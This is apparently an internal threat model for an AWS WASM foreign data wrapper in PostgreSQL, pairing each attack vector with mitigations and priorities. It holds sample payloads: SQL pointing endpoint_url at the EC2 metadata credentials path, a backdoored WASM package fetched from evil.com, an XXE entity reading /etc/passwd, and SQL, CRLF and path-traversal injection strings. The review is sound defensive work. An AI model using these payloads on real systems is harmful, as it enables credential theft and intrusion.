# AWS FDW Security Analysis & Attack Vectors

## Executive Summary

This document identifies potential security vulnerabilities in the AWS WASM FDW implementation and proposes mitigations. Written from an attacker's perspective to identify and close security gaps.

---

## 1. SSRF (Server-Side Request Forgery) - CRITICAL

### Attack Vector
The `endpoint_url` server option allows arbitrary URL specification:

```sql
-- Attacker creates server pointing to AWS metadata service
CREATE SERVER evil_server
  FOREIGN DATA WRAPPER aws_wrapper
  OPTIONS (
    fdw_package_url 'file:///path/to/aws_fdw.wasm',
    aws_access_key_id 'anything',
    aws_secret_access_key 'anything',
    region 'us-east-1',
    endpoint_url 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  );

-- Now query to exfiltrate IAM role credentials from EC2 metadata
CREATE FOREIGN TABLE steal_creds (data text)
SERVER evil_server OPTIONS (service 's3', object 'buckets');
SELECT * FROM steal_creds;
```

### Impact
- **Steal IAM credentials** from EC2 instance metadata
- **Access internal services** (databases, admin panels)
- **Port scan** internal network
- **Bypass firewalls** by making requests from trusted internal IP

### Current Status: VULNERABLE
The code does NOT validate `endpoint_url`:
```rust
// lib.rs - No validation of endpoint_url
this.endpoint_url = opts.get("endpoint_url");
```

### Mitigation
- Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
- Block link-local (169.254.x.x)
- Block localhost (127.x.x.x, ::1)
- Whitelist only *.amazonaws.com domains
- Require HTTPS for non-localhost endpoints

---

## 2. Credential Exposure - HIGH

### Attack Vector 2.1: Credentials in Error Messages
```sql
-- Trigger auth error that might leak credentials
CREATE SERVER bad_region_server
  FOREIGN DATA WRAPPER aws_wrapper
  OPTIONS (
    aws_access_key_id 'AKIAIOSFODNN7EXAMPLE',
    aws_secret_access_key 'wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY',
    region 'invalid-region-12345',
    endpoint_url 'https://s3.invalid-region.amazonaws.com'
  );

-- Error message might contain: "Auth failed for AKIAIOSFODNN7EXAMPLE"
SELECT * FROM test_table;
```

### Attack Vector 2.2: EXPLAIN VERBOSE Exposure
```sql
-- EXPLAIN might show server options including credentials
EXPLAIN (VERBOSE, FORMAT JSON) SELECT * FROM aws_s3_buckets;
```

### Attack Vector 2.3: pg_foreign_server Catalog
```sql
-- Query system catalogs for credentials
SELECT srvoptions FROM pg_foreign_server WHERE srvname = 'aws_server';
```

### Current Status: PARTIALLY VULNERABLE
- Error messages may contain credential hints
- Catalog stores credentials (PostgreSQL's responsibility, but we should use Vault)

### Mitigation
- Never include credentials in error messages
- Use Vault for credential storage exclusively in production
- Mask credentials in any debug output

---

## 3. SQL Injection via Options - MEDIUM

### Attack Vector
```sql
-- Bucket name with SQL injection attempt
CREATE FOREIGN TABLE injection_test (key text)
SERVER aws_server
OPTIONS (
  service 's3',
  object 'objects',
  bucket 'test''); DROP TABLE users; --'
);
```

### Current Status: LIKELY SAFE
Options are passed as parameters, not concatenated into SQL. However, we should verify.

### Mitigation
- Validate all option values against allowed patterns
- Bucket names: ^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$
- Zone IDs: ^[A-Z0-9]+$

---

## 4. XML External Entity (XXE) Injection - HIGH

### Attack Vector
If AWS (or LocalStack/attacker-controlled endpoint) returns malicious XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<ListBucketsResult>
  <Bucket>
    <Name>&xxe;</Name>
  </Bucket>
</ListBucketsResult>
```

### Current Status: LIKELY SAFE
We use simple string parsing, not a full XML parser:
```rust
fn extract_xml_value(xml: &str, tag: &str) -> Option<String>
```

This is actually safer than using a full XML parser with entity expansion.

### Mitigation
- Continue using simple string parsing (no entity expansion)
- Add explicit tests for XXE attempts
- Limit response size

---

## 5. Denial of Service - MEDIUM

### Attack Vector 5.1: Pagination Abuse
```sql
-- Query a bucket with millions of objects
-- Each page fetches 1000 objects, attacker forces full scan
SELECT count(*) FROM s3_objects WHERE bucket = 'giant-bucket';
```

### Attack Vector 5.2: Large Response
Malicious endpoint returns multi-GB response:
```sql
-- Attacker's endpoint returns infinite stream
CREATE SERVER dos_server OPTIONS (endpoint_url 'http://evil.com/infinite');
SELECT * FROM dos_table;  -- OOM or disk exhaustion
```

### Attack Vector 5.3: Resource Exhaustion
```sql
-- Open many concurrent connections
SELECT * FROM aws_table_1 UNION ALL
SELECT * FROM aws_table_2 UNION ALL
-- ... repeat 1000 times
```

### Current Status: VULNERABLE
No limits on response size or pagination depth.

### Mitigation
- Add `max_response_size` limit (e.g., 100MB)
- Add `max_pages` limit for pagination
- Add timeout for HTTP requests
- Rate limiting at connection level

---

## 6. Read-Only Bypass Attempts - HIGH

### Attack Vector 6.1: HTTP Method Manipulation
The code constructs HTTP requests. Could an attacker manipulate this?

```rust
// Current code always uses GET
let req = http::Request {
    method: http::Method::Get,  // Hardcoded - GOOD
    ...
};
```

### Attack Vector 6.2: Request Body Injection
Could bucket name or other options inject a request body?
```sql
-- Attempt to inject POST body via bucket name
OPTIONS (bucket = 'test\r\n\r\n{"delete": true}')
```

### Current Status: LIKELY SAFE
- HTTP methods are hardcoded
- Options go through URL encoding

### Mitigation
- Add explicit assertions that only GET/HEAD are used
- Log and alert on any mutation attempt

---

## 7. Supply Chain Attack - CRITICAL

### Attack Vector
The `fdw_package_url` option specifies where to load the WASM:

```sql
CREATE SERVER evil_server
  FOREIGN DATA WRAPPER wasm_fdw_handler
  OPTIONS (
    fdw_package_url 'https://evil.com/backdoored_aws_fdw.wasm',
    fdw_package_name 'supabase:aws-fdw',
    fdw_package_version '0.1.0'
  );
```

### Impact
- Execute arbitrary code via malicious WASM
- Steal all credentials passed to the FDW
- Pivot to attack internal systems

### Current Status: PARTIALLY MITIGATED
- `fdw_package_checksum` exists but may not be enforced

### Mitigation
- REQUIRE checksum verification
- Whitelist allowed package URLs
- Sign WASM packages

---

## 8. DNS Rebinding - MEDIUM

### Attack Vector
1. Attacker controls evil.com, initially resolves to legitimate IP
2. User creates server with `endpoint_url = 'https://evil.com'`
3. DNS TTL expires, evil.com now resolves to 169.254.169.254
4. FDW makes request to metadata service

### Current Status: VULNERABLE
No DNS pinning implemented.

### Mitigation
- Cache DNS resolution for duration of query
- Re-validate IP after DNS resolution

---

## 9. Cross-Account Data Access - MEDIUM

### Attack Vector
User A creates a server with their credentials:
```sql
CREATE SERVER user_a_aws OPTIONS (aws_access_key_id 'A_KEY', ...);
```

User B (if they have access to same database) could query User A's AWS:
```sql
CREATE FOREIGN TABLE steal_data (...) SERVER user_a_aws OPTIONS (...);
SELECT * FROM steal_data;  -- Using User A's credentials!
```

### Current Status: POSTGRESQL RESPONSIBILITY
Foreign server permissions are managed by PostgreSQL.

### Mitigation
- Document proper GRANT/REVOKE usage
- Recommend separate schemas per user
- Consider credential-per-table option

---

## 10. Timing Attacks on Signature - LOW

### Attack Vector
Compare signatures byte-by-byte, timing reveals correct bytes:
```rust
// VULNERABLE pattern:
if calculated_sig == expected_sig { ... }

// Character-by-character comparison leaks timing
```

### Current Status: NOT APPLICABLE
We generate signatures, not validate them. AWS validates.

---

## 11. Path Traversal - MEDIUM

### Attack Vector
```sql
-- Attempt path traversal in S3 key
SELECT * FROM s3_objects
WHERE bucket = 'mybucket'
AND key LIKE '../../../etc/passwd';

-- Or in prefix option
OPTIONS (prefix = '../../../')
```

### Current Status: LIKELY SAFE
S3 keys are just strings to S3, no filesystem access. But validate anyway.

### Mitigation
- Sanitize prefix to remove ../ sequences
- Log suspicious patterns

---

## 12. Header Injection - MEDIUM

### Attack Vector
```sql
-- Inject headers via option values
OPTIONS (bucket = 'test\r\nX-Injected: evil\r\n')
```

### Current Status: NEEDS VERIFICATION
URL encoding should prevent this, but verify.

### Mitigation
- Strip CR/LF from all option values
- Validate against header injection patterns

---

## Priority Matrix

| Vulnerability | Severity | Exploitability | Priority |
|--------------|----------|----------------|----------|
| SSRF via endpoint_url | CRITICAL | Easy | P0 |
| Supply Chain (WASM URL) | CRITICAL | Medium | P0 |
| Credential Exposure | HIGH | Easy | P1 |
| DoS via Large Response | MEDIUM | Easy | P1 |
| DNS Rebinding | MEDIUM | Medium | P2 |
| Header Injection | MEDIUM | Hard | P2 |
| XXE (mitigated) | LOW | Hard | P3 |
| Path Traversal | LOW | Hard | P3 |

---

## Recommended Security Tests

See `test_security_advanced.sql` for implementation of tests covering:
1. SSRF blocking tests
2. Credential sanitization tests
3. Input validation tests
4. DoS protection tests
5. Read-only enforcement tests

